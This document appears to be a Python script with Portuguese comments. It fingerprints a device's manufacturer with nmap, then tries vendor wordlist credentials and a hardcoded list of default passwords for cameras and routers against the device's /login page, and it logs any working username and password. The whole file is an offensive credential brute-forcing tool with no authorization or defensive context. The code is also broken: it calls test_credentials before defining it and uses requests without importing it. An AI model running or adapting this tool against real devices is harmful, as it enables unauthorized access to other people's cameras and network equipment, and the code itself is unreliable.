import nmap
import logging
from datetime import datetime

def get_manufacturer_from_host(host):
    nm = nmap.PortScanner()
    nm.scan(host, arguments="-O")
    if 'osmatch' in nm[host]:
        os_match = nm[host]['osmatch']
        if os_match:
            return os_match[0]['osclass'][0]['vendor']
    return None

# Configurar o logger
logging.basicConfig(filename='credentials.log', level=logging.INFO,
                    format='%(asctime)s %(message)s', datefmt='%Y-%m-%d %H:%M:%S')

# Obter o host do usuário
target_host = input("Digite o host (endereço IP ou nome de domínio) do dispositivo: ")

# Obter o fabricante do dispositivo
manufacturer = get_manufacturer_from_host(target_host)
if manufacturer:
    logging.info("Fabricante do dispositivo: %s", manufacturer)

    # Carregar a wordlist correspondente ao fabricante
    wordlist_path = "wordlist.txt"  # Caminho para a wordlist no repositório local
    with open(wordlist_path, 'r') as file:
        wordlist = [line.strip().split(",") for line in file]

    # Adicionar senhas comuns
    common_passwords = ['12345', 'root', 'admin', '123456', '9999', '1234', 'pass', 'ce', '666666', '888888', 'camera', '11111111', 'fliradmin', '9999', 'HuaWei123', 'ChangeMe123', 'config', 'instar', '123456789system', 'jvc', '1111', 'ms1234', 'password', '4321', 'password', 'ikwd', 'ubnt', 'supervisor']

    # Verificar cada combinação de usuário e senha na wordlist para o fabricante correspondente e senhas comuns
    for line in wordlist:
        # Verificar se o fabricante na wordlist é igual ao fabricante do dispositivo
        if line[0].lower() == manufacturer.lower():
            user, password = line[1], line[2]
            if test_credentials(target_host, manufacturer, user, password):
                break
    else:
        # Nenhuma combinação válida encontrada para o fabricante específico, testar todas as combinações
        logging.info("Nenhuma combinação válida encontrada para o fabricante %s. Testando todas as combinações...", manufacturer)
        for line in wordlist:
            user, password = line[1], line[2]
            if test_credentials(target_host, manufacturer, user, password):
                break
        else:
            logging.info("Nenhuma combinação válida encontrada para o fabricante do dispositivo. Testando senhas comuns...")
            for password in common_passwords:
                if test_credentials(target_host, manufacturer, "", password):
                    break
            else:
                logging.info("Nenhuma combinação válida encontrada para o fabricante do dispositivo e senhas comuns.")
else:
    logging.info("Fabricante do dispositivo não encontrado.")
    print("Fabricante do dispositivo não encontrado.")

def test_credentials(host, manufacturer, user, password):
    login_url = f"http://{host}/login"
    payload = {
        "username": user,
        "password": password
    }
    response = requests.post(login_url, data=payload)
    if response.status_code == 200:
        logging.info("Credenciais válidas encontradas:")
        logging.info("Hora: %s", datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
        logging.info("Host: %s", host)
        logging.info("Fabricante: %s", manufacturer)
        logging.info("Usuário: %s", user)
        logging.info("Senha: %s", password)
        print("Credenciais válidas encontradas:")
        print(f"Fabricante: {manufacturer}")
        print(f"Usuário: {user}")
        print(f"Senha: {password}")
        return True
    return False
